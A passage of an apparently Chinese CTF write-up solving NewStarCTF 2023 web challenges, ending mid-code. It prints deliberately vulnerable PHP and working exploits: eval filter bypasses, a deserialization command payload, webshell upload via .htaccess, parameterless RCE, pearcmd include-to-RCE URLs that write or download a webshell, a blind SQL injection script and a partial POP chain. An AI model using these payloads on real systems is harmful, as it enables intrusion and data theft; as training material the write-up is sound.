    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//采用变量覆盖 -> flag5='.'</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9]/"</span><span class="token punctuation">,</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag5</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_v.a.l'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$password</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_v.a.l'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"c4d038"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//爆破出来是114514</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|pass|cat|ls/i"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后就是</p>
<blockquote>
<p>**password&#x3D;114514&amp;e[v.a.l&#x3D;echo <code>more /fl??</code>;**<br><img src="https://img-blog.csdnimg.cn/9c50573ea17242a8a5b0d8ec5c77f872.png" alt="1"></p>
</blockquote>
<h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>打开就是一个登录框<br>尝试admin弱密码000000成功登录通过查看burp的记录发现302跳转，存在flag。<br><img src="https://img-blog.csdnimg.cn/b2b750f96f9645d28a39e9f346dfd175.png" alt="2"></p>
<h2 id="week2-web"><a href="#week2-web" class="headerlink" title="week2-web"></a>week2-web</h2><p>挑一些重要的写吧。。。</p>
<h3 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Maybe you need learn some knowledge about deserialize?</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token comment">//这里的cmd是私有属性</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|tac|more|tail|base/i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            @<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>private反序列化后是%00(类名)%00(变量名)，protect是%00*%00(变量名)</p>
</blockquote>
<p>exp</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"nl /th1s_1s_fffflllll4444aaaggggg"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p>文件上传、<code>.htaccess文件</code><br>先上传.htaccess文件<br><img src="https://img-blog.csdnimg.cn/06c6774f41e748d3937afeb063413849.png" alt="123"></p>
<p>在上传图片马<br><img src="https://img-blog.csdnimg.cn/d6feb5d5e82246a686a979196cfb1fcf.png" alt="123"><br>即可成功命令执行</p>
<h3 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p>.git源码泄露<br><img src="https://img-blog.csdnimg.cn/94e16be6682f42139c3071d6964ebc59.png" alt="456"><br>查看bo0g1pop.php文件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>if (&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;star&#39;]))</code>无参数rce</p>
<blockquote>
<p>GET：<br>star&#x3D;eval(next(getallheaders()));<br><img src="https://img-blog.csdnimg.cn/bffdd37418c0412c80b75fb545225002.png" alt="123"></p>
</blockquote>
<h2 id="week3-web"><a href="#week3-web" class="headerlink" title="week3-web"></a>week3-web</h2><h3 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h3><p>知识点：下载木马文件到靶机、register_argc_argv</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|log|session|filter|input|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment"># Something in phpinfo.php!</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>先包含phpinfo.php文件看看<br>搜索flag发现提示<code>register_argc_argv</code><br><img src="https://img-blog.csdnimg.cn/b99c8a88c07a4e6286d25ca285e74158.png" alt="456"><br>找找有没有相关漏洞，恰好找到了一篇文章：<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/">registerargcargv与include to RCE的巧妙组合</a></p>
<blockquote>
<p>&#x2F;&#x2F;通过本地直接写入webshell,注意这里最好抓包然后用burpsuite或者直接curl执行，否则浏览器会将&lt; ? &gt; 转义<br>&#x2F;&#x2F; config-create可以直接创建配置文件，且第一个参数必须以&#x2F;开头<br><code>http://ip:port/include.php?f=pearcmd&amp;+config-create+/&lt;?=phpinfo();?&gt;+/tmp/evil.php</code><br>&#x2F;&#x2F; 通过远程直接下载webshell<br>&#x2F;&#x2F; web目录可写</p>
<ul>
<li><code>http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</code></li>
<li><code>http://ip:port/tmp/pear/download/evil.php</code><br>&#x2F;&#x2F; tmp目录可写</li>
<li><code>http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</code></li>
<li><code>http://ip:port/include.php?f=/tmp/pear/download/evil</code></li>
</ul>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/7d3cce3881de4f9a89bc8e659bf3f395.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/66e920198f60410f8ba08d44e18bb64f.png" alt="789"><br>然后访问<code>/tmp/pear/download/1.php</code>发现成功传入<br><img src="https://img-blog.csdnimg.cn/1daa56ab972347a98aa42ad9931a2d1a.png" alt="456"></p>
<h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p>知识点：sql盲注<br><img src="https://img-blog.csdnimg.cn/a6ea86a9c7d14d3d853ce0e18ea3c65f.png" alt="1"><br>尝试注入：<br>单引号不回显<br><code>1TMP3074&#39;Or 1=1 -- -</code><br>成功回显<br>burp测试过滤的函数或字符，发现如下的被过滤了<br><img src="https://img-blog.csdnimg.cn/8bc362b3464d4e77a078e91c27a32ddf.png" alt="1"><br>使用order by发现存在5个表，但是后面再使用union是发现没有union，换一种方法<br>使用盲注判断当前数据库名的字符数<br><code>?id=1TMP3074&#39; Or length(database()) &gt; 2--+</code>回显<br><code>?id=1TMP3074&#39; Or length(database()) &gt; 3--+</code>不回显，说明当前数据库名的字符数为三。<br>然后判断数据库名到底是什么<br><code>?id=1TMP3074&#39;Or mid(database(),1,1)= &#39;b&#39; --</code>这样太慢了，使用脚本<br>最后的exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://13d36774-d283-422c-98f2-9164d199a034.node4.buuoj.cn:81/?id=TMP0919'AND "</span>

result <span class="token operator">=</span> <span class="token string">''</span>
i <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Ascii(Substr((Select flag from here_is_flag),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">--+'</span></span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"points"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 暂停1秒，降低爬取速度</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/18afb59598064b03b3ab0b7644b4a319.png" alt="1"></p>
<h3 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h3><p>考点：php反序列化串链子。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Begin</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9]/"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome to NewStarCTF 2023!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Then</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$func</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Good Job!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Handle</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Super</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">getStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"==GAME OVER=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">-></span><span class="token property">log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">WhiteGod</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unset</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大致审一下代码可以发现出口为<code>WhiteGod</code>类</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">
<span class="token keyword">class</span> <span class="token class-name-definition class-name">WhiteGod</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span><span class="token comment">//赋值为system</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span><span class="token comment">//赋值为ls</span>
 				
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unset</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//两者结合可以进行命令执行   </span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么入口就是<code>Begin</code>类</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Begin</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
 
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9]/"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome to NewStarCTF 2023!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大致链子：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Begin</span><span class="token operator">::</span><span class="token constant">__destruct</span><span class="token operator">-></span><span class="token class-name static-context">Then</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token operator">-></span><span class="token class-name static-context">Super</span><span class="token operator">::</span><span class="token constant">__invoke</span><span class="token operator">-></span><span class="token class-name static-context">Handle</span><span class="token operator">::</span><span class="token constant">__call</span><span class="token operator">-></span><span class="token class-name static-context">CTF</span><span class="token operator">::</span><span class="token constant">end</span><span class="token operator">-></span><span class="token class-name static-context">WhiteGod</span><span class="token operator">::</span><span class="token constant">__unset</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>exp:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Begin</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Then</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//触发Then类中的__toString()方法</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Then</span><span class="token punctuation">&#123;</span>
